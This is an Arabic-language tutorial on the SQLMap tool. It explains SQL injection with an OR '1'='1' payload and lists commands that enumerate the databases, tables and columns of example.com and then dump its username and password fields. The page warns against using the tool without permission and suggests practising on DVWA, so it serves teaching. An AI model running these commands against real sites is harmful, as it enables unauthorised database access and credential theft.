SQLMap

أداة كشف واستغلال ثغرات SQL Injection

يعني إيه SQLMap؟

SQLMap هي أداة مفتوحة المصدر بتكشف ثغرات SQL Injection في المواقع. لو الموقع فيه ثغرة، SQLMap تقدر تستغلها وتوصل لقاعدة البيانات.

يعني إيه SQL Injection؟

لما الموقع بياخد بيانات من المستخدم وبيحطها في استعلام SQL من غير تأمين، المهاجم يقدر يحقن أوامر SQL تخلية يطلع بيانات مش المفروض يشوفها.

# استعلام عادي SELECT * FROM users WHERE id = '1' # استعلام مخترق SELECT * FROM users WHERE id = '1' OR '1'='1'

التثبيت

pip install sqlmap sqlmap --version

الأوامر الأساسية

1. فحص رابط

sqlmap -u "http://example.com/page.php?id=1"

2. فحص مع Cookie

sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abc123"

3. استخراج قواعد البيانات

sqlmap -u "http://example.com/page.php?id=1" --dbs

4. استخراج الجداول

sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

5. استخراج الأعمدة

sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --columns

6. استخراج البيانات

sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users -C username,password --dump

الخيارات المهمة

  • -u: الرابط
  • --dbs: عرض قواعد البيانات
  • --tables: عرض الجداول
  • --columns: عرض الأعمدة
  • --dump: استخراج البيانات
  • --batch: موافقة تلقائية
  • --level: مستوى الفحص (1-5)
  • --risk: مستوى المخاطرة (1-3)
خطر: SQLMap بتلمس السيرفر بشكل واضح. متستخدمهاش على أي موقع مش بتاعك أو مش بإذن.

تمارين

  2. استخدم DVWA (Damn Vulnerable Web App)
  3. جرب SQLMap على بيئة تدريب
